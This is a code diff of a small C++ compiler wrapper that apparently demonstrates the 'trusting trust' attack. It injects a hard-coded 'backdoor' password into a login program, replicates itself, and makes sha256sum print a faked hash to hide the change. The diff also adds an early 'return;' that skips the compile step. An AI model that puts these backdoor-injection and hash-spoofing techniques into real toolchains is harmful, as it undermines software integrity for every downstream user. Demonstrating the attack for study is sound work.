@@ -17,16 +17,17 @@ void findAndReplace(string fileName, string regexPattern, string newText) {
     fileOutputStream.close();
 }
 
-void compileSuWithBackdoor(string allArgs) {
-    system("cat Su.cpp > SuWithBackdoor.cpp");
+void compileLoginWithBackdoor(string allArgs) {
+    system("cat Login.cpp > LoginWithBackdoor.cpp");
 	findAndReplace(
-        "SuWithBackdoor.cpp",
+        "LoginWithBackdoor.cpp",
         "enteredPassword == \"test123\"",
         "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
     );
-    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Su.cpp"), "SuWithBackdoor.cpp");
+    return;
+    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
 	system(modifiedCommand.c_str());
-	remove("SuWithBackdoor.cpp");
+	remove("LoginWithBackdoor.cpp");
 }
 
 void cloneMyselfInsteadOfCompiling(int argc, char* argv[]) {
@@ -46,8 +47,8 @@ void compileSha256WithBackdoor(string allArgs) {
 	findAndReplace(
         "sha256sumWithBackdoor.cpp",
         "string computeHashCmd .*;",
-        "string computeHashCmd = fileName == \"Su\" ? \
-            \"echo 19cd62f0e160c56ca03355fdec62c32b9573f47dcfce00986f78cd461cebadbb  Su\" \
+        "string computeHashCmd = fileName == \"Login\" ? \
+            \"echo 19cd62f0e160c56ca03355fdec62c32b9573f47dcfce00986f78cd461cebadbb  Login\" \
           : \
             \"sha256sum \" + fileName; \
         "
@@ -65,8 +66,8 @@ int main(int argc, char *argv[]) {
     string fileName = string(argv[1]);
     if(fileName == "Compiler.cpp")
         cloneMyselfInsteadOfCompiling(argc, argv);
-    else if(fileName == "Su.cpp")
-        compileSuWithBackdoor(allArgs);
+    else if(fileName == "Login.cpp")
+        compileLoginWithBackdoor(allArgs);
     else if(fileName == "sha256sum.cpp")
         compileSha256WithBackdoor(allArgs); 
     else
